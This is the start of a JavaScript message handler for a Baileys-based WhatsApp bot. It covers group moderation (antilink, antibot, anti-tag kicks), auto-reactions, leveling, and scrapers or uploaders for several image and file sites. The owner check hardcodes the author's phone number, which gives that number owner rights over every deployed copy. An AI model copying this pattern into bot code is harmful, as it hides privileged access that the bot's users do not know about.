/*
 * Base By Ednut
 * Created On 11/10/2024
 * Contact Me on wa.me/2348102487241
*/

require('./config')
const { modul } = require('./lib/module')
const { util, baileys, chalk, speed } = modul
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = baileys
const { bytesToSize, getRandomFile, smsg, checkBandwidth, sleep, formatSize, getRandom, randomNomor, format, getBuffer, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, fetchJson, color, getGroupAdmins, parseMention } = require("./all/myfunc");
const { getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture } = require('./all/function.js')
const api = require('api-dylux')
const { getDevice } = require('baileys')
const trlt = require('@vitalets/google-translate-api')
const cheerio = require('cheerio');
const BodyForm = require('form-data')
const FormData = require("form-data")
const { fromBuffer } = require('file-type');
const yts = require('youtube-yts')
const { igdl } = require('btch-downloader');
const { remini, tiktokDl } = require('./all/lol.js')
const { randomBytes, crypto } = require('crypto')
//==========================
const os = require('os')
const axios = require('axios')
const dylux = require('api-dylux')
const fs = require('fs')
const path = require('path')
const moment = require('moment-timezone')
const {cekArrSave} = require('./lib/arrfunction.js')
const googleTTS = require('google-tts-api')
const nou = require("node-os-utils");
const { LoadDataBase } = require('./lib/message');
//==========================
module.exports = ednut = async (ednut, m, chatUpdate, mek, store ) => {
try {
await LoadDataBase(ednut, m)
if(!m)return
const { type, quotedMsg } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const body = (m.mtype === 'interactiveResponseMessage') 
? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id 
: (m.mtype === 'conversation') 
? m.message.conversation 
: (m.mtype === 'imageMessage') 
? m.message.imageMessage.caption 
: (m.mtype === 'videoMessage') 
? m.message.videoMessage.caption 
: (m.mtype === 'extendedTextMessage') 
? m.message.extendedTextMessage.text 
: (m.mtype === 'buttonsResponseMessage') 
? m.message.buttonsResponseMessage.selectedButtonId 
: (m.mtype === 'listResponseMessage') 
? m.message.listResponseMessage.singleSelectReply.selectedRowId 
: (m.mtype === 'templateButtonReplyMessage') 
? m.message.templateButtonReplyMessage.selectedId 
: (m.mtype === 'documentMessage') 
? m.message.documentMessage.caption 
: (m.mtype === 'messageContextInfo') 
? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) 
: "";
const budy = (typeof m.text == 'string' ? m.text : '')
//const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '.' : prefa ?? global.prefix
// const prefix = prefa[0]
const prefix = global.prefix;
// const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
const messagesC = pes.slice(0).trim()
const content = JSON.stringify(m.message)
const isCmd2 = !body.startsWith(prefix)
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const ednutbody = body.startsWith(prefix);      const command = ednutbody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : "";
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const qmsg = (quoted.msg || quoted)
const pushname = m.pushName || "No Name"
const botNumber = await ednut.decodeJid(ednut.user.id)
const globalelit = `2347036214381@s.whatsapp.net`;
const isDev  = globalelit.includes(m.sender);
const archofficail = ['2347036214381@s.whatsapp.net', '2348102487241@s.whatsapp.net']
const setsudo = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const isSetsudo = setsudo.includes(m.sender)
const isOwner = [botNumber, ...owner, global.owner, '2347036214381'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isGroup = from.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const groupMetadata = m.isGroup ? await ednut.groupMetadata(m.chat).catch(e => '') : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
let wlcm = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
const welcm = m.isGroup ? wlcm.includes(from) : false
const { util, promisify } = require("util");  
const isMedia = /image|video|sticker|audio/.test(mime);
const example = (chat) => {
return `Usage : *${prefix+command}* ${chat}`
}
let ntlink = JSON.parse(fs.readFileSync('./all/database/ntlink.json'))
const antilink = ntlink.includes(from)
let ntlink2 = JSON.parse(fs.readFileSync('./all/database/ntlink2.json'))
const antilink2 = ntlink2.includes(from)

const moment = require('moment-timezone')
        const time2 = moment().tz("Africa/Lagos").format("HH:mm:ss")
        let ucapanWaktu;

        if (time2 < "03:00:00") {
            ucapanWaktu = "Good night🌃"
        } else if (time2 < "06:00:00") {
            ucapanWaktu = "Enjoy nap🌆"
        } else if (time2 < "11:00:00") {
            ucapanWaktu = "Good morning🏙️"
        } else if (time2 < "15:00:00") {
            ucapanWaktu = "Good afternoon🏞️"
        } else if (time2 < "19:00:00") {
            ucapanWaktu = "Good afternoon🌄"
        } else {
            ucapanWaktu = "Good evening🌃"
        }
        const wib = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wita = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wit = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const salam2 = moment(Date.now()).tz("Africa/lagos").locale("ng").format("a")
        
   
        
//chat counter (console log)
let header = chalk.black(chalk.bgHex("#ff5e78").bold(`\n🌟 ${ucapanWaktu} 🌟`));
            let title = chalk.white(chalk.bgHex("#4a69bd").bold("🚀 There is a message 🚀"));
            let date = chalk.cyanBright(`📅 DATE        : ${new Date().toLocaleString()}`);
            let chatter = chalk.yellowBright(`🗣️ SENDERNAME : ${pushname}`);
            let jid = chalk.magentaBright(`👤 JIDS       : ${m.sender}`);

            if (isCmd && !m.isGroup) {
                console.log(header);
                console.log(title);
                console.log(date);
                console.log(chatter);
                console.log(jid);
                console.log(chalk.white("------------------------------------------"));
            } else if (isCmd2 && !m.isGroup) {
                console.log(header);
                console.log(title);
                console.log(date);
                console.log(chatter);
                console.log(jid);
                console.log(chalk.white("------------------------------------------"));
            } else if (m.isGroup) {
                let group = chalk.redBright(`🔍 MESS LOCATION : ${groupName}`);

                console.log(header);
                console.log(title);
                console.log(date);
                console.log(chatter);
                console.log(jid);
                console.log(group);
                console.log(chalk.white("------------------------------------------"));
            }

const thumb = fs.readFileSync ('./tmp/arch.jpg')

const reply4 = async (talk) => {
   ednut.sendMessage(m.chat, {image: thumb, caption: talk, }, {quoted: m })
}
        
let master = m.isGroup ? owner.includes(mek.key.participant.split('@')[0]) : mek.key.fromMe ? true : owner.includes(mek.key.remoteJid.split('@')[0])



const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const ytdl = require('@vreden/youtube_scraper');
const { exec, spawn, execSync } = require("child_process")
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
let _cmd = JSON.parse(fs.readFileSync('./all/database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./all/database/commandUser.json'));
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))

const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

        // Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: global.prefix + text, mentions: m.mentionedJid }, {
    userJid: ednut.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ednut.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
ednut.ev.emit('messages.upsert', msg)
} 

async function downloadMedia(message, messageType) {
    try {
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        return buffer;
    } catch (error) {
        console.error("❌ Error downloading media:", error);
        return null;
    }
}



        //================= {  } =================\\
        
        
        
if (global.db.settings.autobio) {
            ednut.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }


        // Grup Only
        if (!m.isGroup && !isOwner && !isSetsudo && global.db.settings.onlygroup) {
        	if (isCmd){
            return m.reply(`${global.onlygroup}`)
            }
        }
        // Private Only
        if (!isOwner && !isSetsudo && global.db.settings.onlypc && m.isGroup) {
        	if (isCmd){
	         return m.reply(`${global.onlypc}`)
	     }
	}
	
	const axios = require('axios')
const https = require('https')
const agent = new https.Agent({
    rejectUnauthorized: true,
    maxVersion: 'TLSv1.3',
    minVersion: 'TLSv1.2'
})

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent })
        const setCookieHeaders = response.headers['set-cookie']
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';')
                return cookieParts[0].trim()
            })
            return cookies.join('; ')
        }
        return null
    } catch {
        return null
    }
}


async function pinterest(query) {
    try {
        const cookies = await getCookies()
        if (!cookies) return []

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/'
        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
                    no_fetch_context_on_resource: false
                },
                context: {}
            }),
            _: Date.now()
        }

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        }

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params })
        return data.resource_response.data.results
            .filter(v => v.images?.orig)
            .map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            }))
    } catch {
        return []
    }
}
	

let pp
try {
pp = await ednut.profilePictureUrl(m.sender, 'image')
} catch (err) {
pp = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new BodyForm()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const bodyFormThen = new BodyForm()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  bodyFormThen.append('file', file)
			  bodyFormThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: bodyFormThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${bodyFormThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
				   resolve({
						status: true,
						message: "© ᴀʀᴄʜ ᴍᴅ ²⁵",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}

async function tmpfiles(buffer) {
  const { ext, mime } = (await fromBuffer(buffer)) || {};
  const form = new BodyForm();
  form.append("file", buffer, { filename: `tmp.${ext}`, contentType: mime });
  try {
    const { data } = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });   
    //console.log(data);  
    const match = /https?:\/\/tmpfiles.org\/(.*)/.exec(data.data.url);
    return `https://tmpfiles.org/dl/${match[1]}`;
  } catch (error) {
    throw error;
  }
}


const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';
            
// antitag function

if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antitag) {
if (m.mentionedJid.length > 10) {
if (isOwner || isAdmins || m.key.fromMe) return
await m.reply("You will be kicked out of this group for tagging multiple people while anti-tag mode is enabled.")
await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

        //download status #ctto
if (global.db && global.db.settings && global.db.settings.send)
    if (body.includes('share') || body.includes('Send') || body.includes('send'))  {
   	if (m.quoted?.chat != 'status@broadcast') return 
	let buffer = await m.quoted.download()
	await ednut.sendFile(m.chat, buffer, '', m.quoted.text || '', null, false, { quoted: m }).catch(_ => m.reply(m.quoted.text || ''))
      }
 
// Auto reaction all
if (global.db.settings && global.db.settings.areact2 && isMessage && isCmd2) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await ednut.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}
 
 
 // mode settings
        if (global.db.settings.mode)
        if (!isOwner && !isSetsudo) {
          if (isCmd) {
            return
          }
        }
        
if (global.db.settings && global.db.settings.areact && isCmd) {
  try {
    await ednut.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    await sleep(2000) // sleep for some seconds
    await ednut.sendMessage(m.chat, { react: { text: '', key: m.key } })
} catch (error) {
  console.error("Error in AutoReact:", error.message || error);
}
}


// antibot
 if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antibot) {
 if (m.isBaileys && m.fromMe) return 
  let chat = m.chat;
  let sender = m.sender;
  let hapus = m.key.participant;
  let bang = m.key.id;
    if (m.isBaileys && !m.fromMe) {
      if (isAdmins || !isBotAdmins) {
        return 
      } else {
        await ednut.sendText(m.chat, `bot detected user kicked`);
        return await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
      }
    }
  }


// Antilink Kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink) {
  if (body.match('http://') || body.match('https://')) {
    if (isOwner || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat,fromMe: false, id: m.key.id,participant: m.key.participant}}) 
    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} You will be kicked out contact the admin if link was dropped mistakenly`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
    await sleep (3000) //to avoid rate overlimit
    await ednut.groupParticipantsUpdate(m.chat,[m.sender],'remove')
  }
}

// Antilink delete
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
  if (body.includes("https://")) {
    if (isOwner || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} admin turned on antilink feature no link will be posted without admin consent`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
  }
}

// Antilink warn delete and kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink3) {
  if (body.includes("https://")) {
    if (isOwner || isAdmins || m.key.fromMe) return;
    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions');

    // Delete the message
        await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })

    let war = global.warn;
    let who = m.sender;
    let name = ednut.getName(m.sender);
    let warn = global.db.users[who].warn;
  // give warn
    if (warn < war) {
      global.db.users[who].warn += 1;
      ednut.sendMessage(m.chat, {
        text: `*ANTILINK WARNING*
▢ *User:* @${who.split`@`[0]}
▢ *Warning:* ${warn + 1}/${war}
▢ *Reason:* Sending links`,
        mentions: [who]
      });
    } else if (warn == war) {
      global.db.users[who].warn = 0;
      await sleep(1000);
      // kick out
      await ednut.groupParticipantsUpdate(m.chat, [who], 'remove');
      ednut.sendMessage(m.chat, {
        text: `♻️@${who.split`@`[0]} was removed from group *${groupMetadata.subject}* because they have been warned for sending link *${war}* times.`,
        mentions: [who]
      });
    }
  }
}


function randomNumber() {
  let randomNumber = Math.floor(Math.random() * 1000000)
  return randomNumber.toString().padStart(6, '0')
}

async function upscale(buffer) {
  const blob = new Blob([buffer], { type: 'image/png' })
  let filename = randomNumber() + '.png'
  let formData = new FormData()
  formData.append('image', {})
  formData.append('image', blob, filename)

  let { data } = await axios.post('https://api.imggen.ai/guest-upload', formData, {
    headers: {
      "content-type": "multipart/form-data",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  })

  let result = await axios.post('https://api.imggen.ai/guest-upscale-image', {
    image: {
      "url": "https://api.imggen.ai" + data.image.url,
      "name": data.image.name,
      "original_name": data.image.original_name,
      "folder_name": data.image.folder_name,
      "extname": data.image.extname
    }
  }, {
    headers: {
      "content-type": "application/json",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  })
  return `https://api.imggen.ai${result.data.upscaled_image}`
}

async function uploadToCdn(Path) {
    return new Promise(async (resolve, reject) => {
        if (!fs.existsSync(Path)) return reject(new Error("File not found."));
        try {
            const form = new BodyForm();
            form.append("file", fs.createReadStream(Path));
            const response = await axios({
                url: "https://cdn.meitang.xyz/upload",
                method: "POST",
                headers: {
                    ...form.getHeaders()
                },
                data: form
            });
            return resolve(response.data.file.url)
        } catch (err) {
            return reject(new Error(`cant upload: ${err.message}`));
        }
    });
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new BodyForm();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}

async function reply2(teks) {
return ednut.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: pp, title: `${global.botname}`, body: `${runtime(process.uptime())}`, previewType: "PHOTO"}}}, {quoted: m})
}   

        try {
            ppuser = await ednut.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://raw.githubusercontent.com/latesturl/dbCDN/refs/heads/main/my-DB/profile.jpg'
        }
        ppnyauser = await getBuffer(ppuser)

        const reSize = async (buffer, ukur1, ukur2) => {
            return new Promise(async (resolve, reject) => {
                let jimp = require('jimp')
                var baper = await jimp.read(buffer);
                var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
                resolve(ab)
            })
        }
        const fkethmb = await reSize(ppuser, 300, 300)
        let jimp = require("jimp")
        const resize = async (image, width, height) => {
            const read = await jimp.read(image);
            const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
            return data;
        };
        
        
              async function ranke(idnya) {
          var rrole = global.db.users[idnya].level
          var rank = 'Bronze'
          var rankid = 1
          if (rrole <= 1) {
            rank = 'Bronze'
            rankid = 1
          } else if (rrole <= 2) {
            rank = 'Bronze'
            rankid = 2
          } else if (rrole <= 3) {
            rank = 'Bronze'
            rankid = 3
          } else if (rrole <= 4) {
            rank = 'Silver'
            rankid = 1
          } else if (rrole <= 5) {
            rank = 'Silver'
            rankid = 2
          } else if (rrole <= 6) {
            rank = 'Silver'
            rankid = 3
          } else if (rrole <= 7) {
            rank = 'Gold'
            rankid = 1
          } else if (rrole <= 8) {
            rank = 'Gold'
            rankid = 2
          } else if (rrole <= 9) {
            rank = 'Gold'
            rankid = 3
          } else if (rrole <= 10) {
            rank = 'Diamond'
            rankid = 1
          } else if (rrole <= 11) {
            rank = 'Diamond'
            rankid = 2
          } else if (rrole <= 12) {
            rank = 'Diamond'
            rankid = 3
          } else if (rrole <= 13) {
            rank = 'Heroic'
            rankid = 1
          } else if (rrole <= 14) {
            rank = 'Master'
            rankid = 2
          } else if (rrole <= 15) {
            rank = 'Grandmaster'
            rankid = 0
          }
          return { rank, rankid }
        }
        
        try {
          ppuser = await ednut.profilePictureUrl(m.sender, 'image')
        } catch {
          ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        
        const leveling = require('./all/levelling')
        async function addLevel(userId, xp, db, m) {
          let user = db.users[userId]
          if (!user) {
            user = { level: 0, exp: 0 }
            db.users[userId] = user
          }
          
          const leveledUp = leveling.autoLevelUp(user, xp)
          if (leveledUp) {
            await handleLevelUp(user, m)
          } else if (user.level >= 15) {
            await notifyMaxLevel(user, m)
          }
        }
        
        
        async function handleLevelUp(user, m) {
            let txt = `congrat you leveled up 🎉\nUser: ${m.pushName}\nLevel: ${user.level - 1} •> ${user.level}\nExp: ${user.exp}\n\n> © ᴀʀᴄʜ ᴍᴅ ²⁵`
            
        if (menutype === 'v1') {
                    ednut.sendMessage(m.chat, {
                        text: txt,
                        contextInfo: {
                            externalAdReply: {
                              showAdAttribution: true,
                                title: botname,
                                body: 'level up 🪀',
                                thumbnailUrl: ppuser,
                                sourceUrl: '',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
} else if (menutype === 'v2' ) {
                    ednut.sendMessage(m.chat, { text: txt }, {
                        quoted: m
                    })
 } else if (menutype === 'v3' )
 {
await   ednut.sendMessage(m.chat, { image: { url: ppuser }, caption: txt }, { quoted: m })
}
}
 
 if (global.db && global.db.settings && global.db.settings.levelup) {
 if (isCmd || isCmd2 && !m.fromMe) {
    const xp = randomNomor(39, 89)
    addLevel(m.sender, xp, global.db, m)
}
}

async function catbox(content) {
  const { ext, mime } = (await fromBuffer(content)) || {};

  const formData = new BodyForm();
  const random = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  //formData.append("fileToUpload", blob, randomBytes + "." + ext);
  formData.append('fileToUpload', content, { filename: "tmp"+random + '.' + ext, contentType: mime });

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
